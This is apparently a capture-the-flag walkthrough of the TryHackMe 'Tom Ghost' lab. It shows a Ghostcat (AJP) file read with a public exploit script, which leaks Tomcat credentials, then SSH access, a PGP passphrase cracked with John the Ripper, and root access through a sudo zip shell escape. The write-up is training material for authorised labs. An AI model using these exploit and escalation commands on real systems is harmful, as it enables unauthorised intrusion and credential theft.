k# Tom Ghost - TryHackMe

## Recon:

---

**NMAP**

```
──╼ $sudo nmap -A -sV 10.10.88.247
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-20 23:49 PKT
Nmap scan report for 10.10.88.247
Host is up (0.44s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/20%OT=22%CT=1%CU=37205%PV=Y%DS=4%DC=T%G=Y%TM=6418AAF
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   183.96 ms 10.4.0.1
2   ... 3
4   439.64 ms 10.10.88.247

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.74 seconds

```


# Gathering Resources

## Download Exploit:

[AJP Shooter](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

Clone the repo:

```
$ git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
```

# Exploitation


Port: 8009

Service: ajp13

Goto the directory where the repo was cloned and run the following command:

```
$ python3 ajpShooter.py http://<thm-machine-ip>:8080 8009 /WEB-INF/web.xml read
```

You'll get the following output:

```
       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

The most important part of this output is:

`skyfuck:8730281lkjlkjdqlksalks`

This looks more like a username and password.

The tomcat server has ssh port open, then let's try connecting it with the credentials obtained above:

```
$ ssh skyfuck@10.10.90.195 
```

And what do you know, we are in:

```
skyfuck@10.10.90.195's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 
```

Here, we have successfully exploited the server and got the access.

# Getting the USER Flag:

Let's see where we can find the user.txt file.

First, we will search in our current directory:

```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

Looks like these are not the file we are looking for but we will get back to these.

Let's look for any other user and see if we can find anything in there directory:

```
skyfuck@ubuntu:~$ cd ..
skyfuck@ubuntu:/home$ ls
merlin  skyfuck
skyfuck@ubuntu:/home$ cd merlin/
skyfuck@ubuntu:/home/merlin$ ls -l
total 4
-rw-rw-r-- 1 merlin merlin 26 Mar 10  2020 user.txt
```

We have found the required file and it seems we can read it as well:

```
skyfuck@ubuntu:/home/merlin$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}
```

AAANnnddd we got our first flag!!

# Privilege Escalation

Now for the final procedure, we need to gain the root access, and that can be done by escalating the priviledges.

Let's re-visits the file that first found in the user's directory.

There were two files:
- credentials.pgp
- tryhackme.asc

Let's download the key file and findout the user by cracking the code using **johntheripper**

```
$ john thm_tomghost_hash --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2023-04-02 01:21) 1.086g/s 1165p/s 1165c/s 1165C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now log back in the server again, we will decrypt the .pgp file:

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

We got the credentials for the other user "merlin", let switch the user and check if it has sudo access to any program:

```
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ cd
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

As you can see, we can use the zip program to break through and gain admin access:

```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# pwd
/home/merlin
# cd /root
# ls
root.txt  ufw
# cat root.txt	
THM{Z1P_1S_FAKE}
```

HOORRAYY!!! WE ROOTED THE MACHINE..

# IMPORTANT 

Kindly review the Walkthrough as there is a guide on how to mitigate this vulnerabilty.

# REFERENCES:

- [GTFOBins](https://gtfobins.github.io/gtfobins/zip/)
- [PGP Encryption/Decryption](https://superuser.com/questions/1196165/pgp-file-decryption-from-linux-cmd-line)
- [Room Walkthrough](https://medium.com/@sushantkamble/apache-ghostcat-cve-2020-1938-explanation-and-walkthrough-23a9a1ae4a23)
